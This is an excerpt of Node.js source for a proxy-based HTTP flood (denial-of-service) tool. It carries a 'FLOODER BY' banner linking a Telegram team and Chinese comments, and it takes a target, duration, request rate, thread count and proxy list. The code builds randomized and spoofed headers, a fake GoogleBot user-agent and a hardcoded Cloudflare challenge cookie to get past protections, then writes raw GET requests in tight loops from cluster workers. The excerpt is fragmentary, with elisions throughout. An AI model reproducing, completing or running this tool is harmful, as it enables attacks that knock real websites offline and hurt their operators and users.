...
<target> <duration> <request per second> <threads> <proxyfile>`));; process.exit();
}
const headers = {};
...
const cookie = [
    "?__cf_chl_tk=mf554AnFOc8GK89qHdAP7nP03P9EXePYzmoM31C0wew-1714762108-0.0.1.1-1557",
...
const rateHeaders = [
    ...
    { "content-type": tipe },
    { "Access-Control-Request-Method": randomMethod },
    { "Expect": "100-continue" },
...
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        ...
        console.log(`[!] FLOODER BY https://t.me/ZeroDawnTeam`);
        console.log(gradient.vice(`------------------------------------------`))
    ...
    setTimeout(() => {
        console.log('攻击时间已到，结束脚本');
        process.exit(0); // 直接结束脚本
    }, args.time * 1000);
} else {
    ...
    HTTP(options, callback) {
        ...
        connection.on("data", chunk => {
            ...
            if (isAlive === false) {
                connection.destroy();
                // if (debugMode) {
                //     console.error("代理错误: 无效的代理服务器响应", error); // 输出错误信息
                //   }
...
headers["cookie"] = randomHeaders["cookie"] + CookieCf;
...
headers["content-lenght"] = "961";
headers["Forwarded"] = "for=192.168.0.1;proto=http;by=" + spoofed;
...
function runFlooder() {
    ...
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":80",  // 使用 80 端口
        timeout: 100,
    };
        ...
        const client = net.createConnection({
            ...
            const IntervalAttack = setInterval(() => {
                ...
                for (let i = 0; i < args.Rate; i++) {
                    dynHeaders["referer"] = "http://" + parsedTarget.host + parsedTarget.path; // 注意：这里使用 http
                    dynHeaders[":path"] = parsedTarget.path + pathx + randstr(10) + query + randstr(10); // 不需要端口号
                    dynHeaders["user-agent"] = uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);

                    // 生成 HTTP 请求头字符串
                    let httpHeaders = "";
                    for (const header in dynHeaders) {
                        httpHeaders += `${header}: ${dynHeaders[header]}\r\n`;
                    }

                    // 构造完整的 HTTP 请求
                    const httpRequest = `GET ${parsedTarget.path} HTTP/1.1\r\n${httpHeaders}\r\n`;
...
for (var i = 0; i < args.threads; i++) {
    ...
    const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
    s.write(randomMethod + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    s.write(randomMethod + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    s.write(randomMethod + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    s.write(randomMethod + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    s.write(randomMethod + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
...
//http-socket
var pakete = 'GET ' + parsedTarget.host + '/ HTTP/1.2\r\nHost: ' + parsedTarget.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + uap1 + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
